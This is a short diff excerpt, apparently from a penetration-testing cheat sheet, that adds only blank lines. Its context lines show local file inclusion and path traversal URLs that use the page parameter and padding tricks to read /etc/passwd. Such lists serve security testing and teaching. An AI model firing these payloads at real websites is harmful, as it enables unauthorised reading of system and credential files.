@@ -17,3 +17,5 @@ http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
 http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
 http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
 ```
+
+
